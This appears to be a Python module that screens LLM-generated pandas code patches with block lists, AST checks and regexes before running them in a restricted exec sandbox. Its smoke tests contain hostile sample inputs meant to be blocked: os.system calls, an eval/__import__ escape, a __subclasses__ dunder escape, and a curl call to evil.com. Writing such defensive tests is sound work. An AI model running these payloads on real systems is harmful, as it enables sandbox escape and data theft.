import ast
import re
import time
import traceback
from typing import Optional
from copy import deepcopy

import pandas as pd

from observability.observability import StructuredLogger

logger = StructuredLogger.get_logger("executor")

FORBIDDEN_BUILTINS: frozenset = frozenset({
    "eval", "exec", "compile", "__import__",
    "open", "input",
    "getattr", "setattr", "delattr",
    "globals", "locals", "vars", "dir",
    "breakpoint", "exit", "quit",
    "memoryview", "bytearray",
    "classmethod", "staticmethod", "property",
    "super",
})

FORBIDDEN_MODULES: frozenset = frozenset({
    "os", "sys", "subprocess", "shutil",
    "pathlib", "socket", "http", "urllib",
    "requests", "signal", "ctypes", "pickle",
    "shelve", "tempfile", "glob", "fnmatch",
    "io", "codecs", "importlib", "threading",
    "multiprocessing", "asyncio", "webbrowser",
    "ftplib", "smtplib", "telnetlib",
})

FORBIDDEN_METHODS: frozenset = frozenset({
    "to_csv", "to_excel", "to_sql", "to_parquet",
    "to_json", "to_html", "to_pickle", "to_feather",
    "to_stata", "to_clipboard", "to_latex", "to_gbq",
    "read_csv", "read_excel", "read_sql", "read_parquet",
    "read_json", "read_html", "read_pickle", "read_feather",
    "system", "popen", "remove", "rmdir", "unlink",
    "makedirs", "listdir", "walk", "chdir", "chmod",
})

SAFE_BUILTINS: dict = {
    # Type constructors
    "str": str,
    "int": int,
    "float": float,
    "bool": bool,
    "list": list,
    "dict": dict,
    "tuple": tuple,
    "set": set,
    # Numeric operations
    "len": len,
    "range": range,
    "min": min,
    "max": max,
    "sum": sum,
    "abs": abs,
    "round": round,
    # Iteration helpers
    "enumerate": enumerate,
    "zip": zip,
    "sorted": sorted,
    "reversed": reversed,
    "any": any,
    "all": all,
    "map": map,
    "filter": filter,
    # Type checking
    "isinstance": isinstance,
    # Constants (required by Python semantics)
    "True": True,
    "False": False,
    "None": None,
}

# Regex backup patterns
# These catch string-manipulation tricks that might evade AST analysis
# (e.g., constructing dangerous calls from string concatenation).
BACKUP_REGEX_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r'__\w+__',               re.IGNORECASE), "Dunder attribute access"),
    (re.compile(r'\bimport\s+\w+',         re.IGNORECASE), "Import statement"),
    (re.compile(r'\bfrom\s+\w+\s+import',  re.IGNORECASE), "From-import statement"),
    (re.compile(r'\bos\s*\.\s*\w+',        re.IGNORECASE), "os module access"),
    (re.compile(r'\bsys\s*\.\s*\w+',       re.IGNORECASE), "sys module access"),
    (re.compile(r'\bsubprocess\s*\.',       re.IGNORECASE), "subprocess access"),
    (re.compile(r'\bopen\s*\(',            re.IGNORECASE), "open() call"),
]


class CodeSafetyAnalyzer(ast.NodeVisitor):

    def __init__(self):
        self.violations: list[dict] = []

    def _add_violation(
        self,
        category: str,
        detail: str,
        line: int = 0,
    ) -> None:
        """Record a security violation with structured metadata."""
        self.violations.append({
            "category": category,
            "detail": detail,
            "line": line,
        })

    # Import detection

    def visit_Import(self, node: ast.Import) -> None:
        module_names = [alias.name for alias in node.names]
        self._add_violation(
            "IMPORT",
            f"Import statement: import {', '.join(module_names)}",
            node.lineno,
        )
        self.generic_visit(node)

    def visit_ImportFrom(self, node: ast.ImportFrom) -> None:
        self._add_violation(
            "IMPORT",
            f"From-import statement: from {node.module} import ...",
            node.lineno,
        )
        self.generic_visit(node)

    # ── Definition detection (functions, classes) ──

    def visit_FunctionDef(self, node: ast.FunctionDef) -> None:
        self._add_violation(
            "DEFINITION",
            f"Function definition: def {node.name}()",
            node.lineno,
        )
        self.generic_visit(node)

    def visit_AsyncFunctionDef(self, node: ast.AsyncFunctionDef) -> None:
        self._add_violation(
            "DEFINITION",
            f"Async function definition: async def {node.name}()",
            node.lineno,
        )
        self.generic_visit(node)

    def visit_ClassDef(self, node: ast.ClassDef) -> None:
        self._add_violation(
            "DEFINITION",
            f"Class definition: class {node.name}",
            node.lineno,
        )
        self.generic_visit(node)

    # ── Dangerous call detection ──

    def visit_Call(self, node: ast.Call) -> None:

        if isinstance(node.func, ast.Name):
            # Direct call: eval(), exec(), open(), etc.
            if node.func.id in FORBIDDEN_BUILTINS:
                self._add_violation(
                    "DANGEROUS_CALL",
                    f"Forbidden builtin call: {node.func.id}()",
                    node.lineno,
                )

        elif isinstance(node.func, ast.Attribute):
            attr_name = node.func.attr

            # Method call: .to_csv(), .system(), .read_csv()
            if attr_name in FORBIDDEN_METHODS:
                self._add_violation(
                    "DANGEROUS_METHOD",
                    f"Forbidden method call: .{attr_name}()",
                    node.lineno,
                )

            # Module-qualified call: os.system(), subprocess.run()
            if isinstance(node.func.value, ast.Name):
                module_name = node.func.value.id
                if module_name in FORBIDDEN_MODULES:
                    self._add_violation(
                        "FORBIDDEN_MODULE",
                        f"Forbidden module call: {module_name}.{attr_name}()",
                        node.lineno,
                    )

        self.generic_visit(node)

    #  Attribute access detection

    def visit_Attribute(self, node: ast.Attribute) -> None:
        """
        Detect dangerous attribute access patterns.

        Checks for:
          • Dunder access: __builtins__, __class__, __subclasses__
          • Module attribute access: os.path, sys.modules
        """
        # Dunder access (except harmless ones)
        if node.attr.startswith('__') and node.attr.endswith('__'):
            self._add_violation(
                "DUNDER_ACCESS",
                f"Dunder attribute access: {node.attr}",
                getattr(node, 'lineno', 0),
            )

        # Module attribute access (non-call)
        if isinstance(node.value, ast.Name):
            if node.value.id in FORBIDDEN_MODULES:
                self._add_violation(
                    "FORBIDDEN_MODULE",
                    f"Forbidden module access: {node.value.id}.{node.attr}",
                    getattr(node, 'lineno', 0),
                )

        self.generic_visit(node)

    # Scope escape detection

    def visit_Global(self, node: ast.Global) -> None:
        self._add_violation(
            "SCOPE_ESCAPE",
            f"Global statement: global {', '.join(node.names)}",
            node.lineno,
        )
        self.generic_visit(node)

    def visit_Nonlocal(self, node: ast.Nonlocal) -> None:
        self._add_violation(
            "SCOPE_ESCAPE",
            f"Nonlocal statement: nonlocal {', '.join(node.names)}",
            node.lineno,
        )
        self.generic_visit(node)

#  SAFE EXECUTOR — Main class

class SafeExecutor:
    """

    Usage:
        executor = SafeExecutor()
        result = executor.validate_and_execute("df = df.rename(...)", my_df)
        if result["success"]:
            fixed_df = result["modified_df"]
    """

    def __init__(self):
        """
        Initialize the executor.

        No configuration needed — security constants are module-level
        to prevent accidental runtime modification.
        """
        self._execution_count = 0
        self._blocked_count = 0

    # ─── Stage 1: Syntax Validation ──────────────────────────────────

    def _validate_syntax(self, code: str) -> dict:
        """
        Check if the code is syntactically valid Python.

        Uses ast.parse() which is the same parser CPython uses.
        If this fails, the code cannot possibly be executed.

        Args:
            code: Raw Python code string.

        Returns:
            {"valid": bool, "error": str or None}
        """
        try:
            ast.parse(code)
            return {"valid": True, "error": None}
        except SyntaxError as e:
            return {
                "valid": False,
                "error": f"Syntax error at line {e.lineno}: {e.msg}",
            }

    # ─── Stage 2: AST Security Analysis ─────────────────────────────

    def _analyze_ast(self, code: str) -> dict:
        """
        Walk the AST to detect security violations.

        Args:
            code: Syntactically valid Python code string.

        Returns:
            {"safe": bool, "violations": list[dict]}
        """
        try:
            tree = ast.parse(code)
            analyzer = CodeSafetyAnalyzer()
            analyzer.visit(tree)

            return {
                "safe": len(analyzer.violations) == 0,
                "violations": analyzer.violations,
            }

        except Exception as e:
            # AST parsing failure in the analyzer itself
            return {
                "safe": False,
                "violations": [{
                    "category": "ANALYZER_ERROR",
                    "detail": f"AST analysis failed: {str(e)}",
                    "line": 0,
                }],
            }

    # ─── Stage 3: Regex Backup Scan ──────────────────────────────────

    def _scan_patterns(self, code: str) -> dict:
        """
        Regex-based backup scan for patterns that might evade AST analysis.

        This catches edge cases like:
          • String concatenation tricks: eval("o"+"s.system()")
          • Comments containing dangerous patterns
          • Encoded/obfuscated code

        Args:
            code: Code string to scan.

        Returns:
            {"clean": bool, "matches": list[str]}
        """
        matches = []
        for pattern, description in BACKUP_REGEX_PATTERNS:
            if pattern.search(code):
                matches.append(description)

        return {
            "clean": len(matches) == 0,
            "matches": matches,
        }

    #  Combined Validation

    def validate(self, code: str) -> dict:
        """
        Run all three validation stages on the code.

        Returns a comprehensive validation report that the orchestrator
        uses to decide whether to proceed with execution.

        Args:
            code: LLM-generated Python code string.

        Returns:
            {
                "is_valid": bool,
                "syntax": {"valid": bool, ...},
                "ast_analysis": {"safe": bool, "violations": [...]},
                "pattern_scan": {"clean": bool, "matches": [...]},
                "rejection_reasons": [str, ...]
            }
        """
        rejection_reasons = []

        # Check for no-op patches
        stripped = code.strip()
        if not stripped or stripped == "pass" or "# Blocked" in stripped or "# Agent error" in stripped:
            return {
                "is_valid": False,
                "syntax": {"valid": True, "error": None},
                "ast_analysis": {"safe": True, "violations": []},
                "pattern_scan": {"clean": True, "matches": []},
                "rejection_reasons": ["No actionable patch generated (no-op or fallback)"],
            }

        # Stage 1: Syntax
        syntax_result = self._validate_syntax(code)
        if not syntax_result["valid"]:
            rejection_reasons.append(f"Syntax: {syntax_result['error']}")

        #  Stage 2: AST (only if syntax is valid)
        ast_result = {"safe": True, "violations": []}
        if syntax_result["valid"]:
            ast_result = self._analyze_ast(code)
            for violation in ast_result["violations"]:
                rejection_reasons.append(
                    f"AST [{violation['category']}]: {violation['detail']} "
                    f"(line {violation['line']})"
                )

        #  Stage 3: Regex backup
        pattern_result = self._scan_patterns(code)
        for match in pattern_result["matches"]:
            # Only add if not already caught by AST
            reason = f"Pattern: {match}"
            if reason not in rejection_reasons:
                rejection_reasons.append(reason)

        is_valid = len(rejection_reasons) == 0

        if not is_valid:
            self._blocked_count += 1
            logger.warning(
                "Code validation FAILED",
                extra={
                    "rejection_count": len(rejection_reasons),
                    "reasons": rejection_reasons,
                    "code_preview": code[:150],
                },
            )

        return {
            "is_valid": is_valid,
            "syntax": syntax_result,
            "ast_analysis": ast_result,
            "pattern_scan": pattern_result,
            "rejection_reasons": rejection_reasons,
        }

    #  Sandboxed Execution

    def execute(self, code: str, df: pd.DataFrame) -> dict:
        start_time = time.perf_counter()

        try:
            df_copy = deepcopy(df)
            execution_namespace = {
                "df": df_copy,
                "pd": pd,
            }

            restricted_globals = {
                "__builtins__": SAFE_BUILTINS,
            }

            exec(code, restricted_globals, execution_namespace)

            modified_df = execution_namespace["df"]
            elapsed_ms = round((time.perf_counter() - start_time) * 1000, 2)

            if not isinstance(modified_df, pd.DataFrame):
                return {
                    "success": False,
                    "error": (
                        f"Patch corrupted df: expected DataFrame, "
                        f"got {type(modified_df).__name__}"
                    ),
                    "modified_df": None,
                    "execution_time_ms": elapsed_ms,
                }

            self._execution_count += 1

            logger.info(
                "Sandbox execution succeeded",
                extra={
                    "execution_time_ms": elapsed_ms,
                    "rows_before": len(df),
                    "rows_after": len(modified_df),
                    "cols_before": list(df.columns),
                    "cols_after": list(modified_df.columns),
                },
            )

            return {
                "success": True,
                "error": None,
                "modified_df": modified_df,
                "execution_time_ms": elapsed_ms,
            }

        except Exception as e:
            elapsed_ms = round((time.perf_counter() - start_time) * 1000, 2)

            logger.error(
                "Sandbox execution FAILED",
                extra={
                    "error_type": type(e).__name__,
                    "error_message": str(e),
                    "execution_time_ms": elapsed_ms,
                    "code_preview": code[:150],
                },
            )

            return {
                "success": False,
                "error": f"{type(e).__name__}: {str(e)}",
                "modified_df": None,
                "execution_time_ms": elapsed_ms,
            }

    def validate_and_execute(self, code: str, df: pd.DataFrame) -> dict:

        validation = self.validate(code)

        if not validation["is_valid"]:
            return {
                "success": False,
                "error": f"Validation failed: {'; '.join(validation['rejection_reasons'])}",
                "modified_df": None,
                "execution_time_ms": 0.0,
                "validation_passed": False,
                "rejection_reasons": validation["rejection_reasons"],
            }

        # ── Execute if validation passed ──
        exec_result = self.execute(code, df)

        return {
            "success": exec_result["success"],
            "error": exec_result["error"],
            "modified_df": exec_result["modified_df"],
            "execution_time_ms": exec_result["execution_time_ms"],
            "validation_passed": True,
            "rejection_reasons": [],
        }

    def get_stats(self) -> dict:
        """Return executor usage statistics."""
        return {
            "total_executions": self._execution_count,
            "total_blocked": self._blocked_count,
        }


_default_executor: Optional[SafeExecutor] = None


def safe_execute_patch(code: str, df: pd.DataFrame) -> dict:
    """
    Validate and execute an LLM-generated code patch safely.

    Module-level convenience function that manages a default
    SafeExecutor instance.

    Args:
        code: LLM-generated Python code string.
        df:   DataFrame to apply the patch to.

    Returns:
        Combined validation + execution result dict.
    """
    global _default_executor
    if _default_executor is None:
        _default_executor = SafeExecutor()

    return _default_executor.validate_and_execute(code, df)

#  LOCAL TESTING — Demonstrate safe execution capabilities

if __name__ == "__main__":
    import json

    print("=" * 70)
    print("  DataOps Auto-Healer — Safe Executor Smoke Test")
    print("=" * 70)

    executor = SafeExecutor()

    # Create a sample DataFrame with a known issue
    test_df = pd.DataFrame({
        "cust_id": [101, 102, 103],
        "name": ["Alice", "Bob", "Charlie"],
        "amount": ["150.0", "INVALID", "89.99"],
    })
    print(f"\n  Original DataFrame:\n{test_df.to_string(index=False)}\n")

    # Test 1: SAFE code — column rename
    print(" Test 1: SAFE — Column rename")
    safe_code = "df = df.rename(columns={'cust_id': 'customer_id'})"
    result = executor.validate_and_execute(safe_code, test_df)
    print(f"  Success: {result['success']}")
    if result['modified_df'] is not None:
        print(f"  Columns after: {list(result['modified_df'].columns)}")
    print()

    #  Test 2: SAFE code — dtype fix
    print("Test 2: SAFE — Numeric coercion")
    dtype_fix = (
        "df['amount'] = pd.to_numeric(df['amount'], errors='coerce')\n"
        "df['amount'] = df['amount'].fillna(0.0)"
    )
    result = executor.validate_and_execute(dtype_fix, test_df)
    print(f"  Success: {result['success']}")
    if result['modified_df'] is not None:
        print(f"  Amount dtype: {result['modified_df']['amount'].dtype}")
        print(f"  Amount values: {result['modified_df']['amount'].tolist()}")
    print()

    # Test 3: DANGEROUS code — import
    print(" Test 3: BLOCKED — Import statement")
    dangerous_import = "import os\nos.system('echo pwned')"
    result = executor.validate_and_execute(dangerous_import, test_df)
    print(f"  Success: {result['success']}")
    print(f"  Reasons: {result['rejection_reasons']}")
    print()

    #  Test 4: DANGEROUS code — eval
    print("Test 4: BLOCKED — eval() call")
    dangerous_eval = "eval('__import__(\"os\").system(\"ls\")')"
    result = executor.validate_and_execute(dangerous_eval, test_df)
    print(f"  Success: {result['success']}")
    print(f"  Reasons: {result['rejection_reasons']}")
    print()

    # Test 5: DANGEROUS code — file write
    print("Test 5: BLOCKED — df.to_csv() file write")
    dangerous_write = "df.to_csv('/tmp/stolen_data.csv')"
    result = executor.validate_and_execute(dangerous_write, test_df)
    print(f"  Success: {result['success']}")
    print(f"  Reasons: {result['rejection_reasons']}")
    print()

    # Test 6: DANGEROUS code — dunder access
    print("Test 6: BLOCKED — __builtins__ access")
    dangerous_dunder = "df.__class__.__bases__[0].__subclasses__()"
    result = executor.validate_and_execute(dangerous_dunder, test_df)
    print(f"  Success: {result['success']}")
    print(f"  Reasons: {result['rejection_reasons']}")
    print()

    # Test 7: DANGEROUS code — subprocess
    print(" Test 7: BLOCKED — subprocess access")
    dangerous_subprocess = "subprocess.run(['curl', 'http://evil.com'])"
    result = executor.validate_and_execute(dangerous_subprocess, test_df)
    print(f"  Success: {result['success']}")
    print(f"  Reasons: {result['rejection_reasons']}")
    print()

    #  Test 8: No-op patch
    print("Test 8: BLOCKED — No-op patch")
    noop = "pass  # Blocked by safety scanner"
    result = executor.validate_and_execute(noop, test_df)
    print(f"  Success: {result['success']}")
    print(f"  Reasons: {result['rejection_reasons']}")
    print()

    #  Summary
    stats = executor.get_stats()
    print(f"  Executor stats: {json.dumps(stats)}")
    print("=" * 70)
    print("  Safe Executor smoke test complete.")
    print("=" * 70)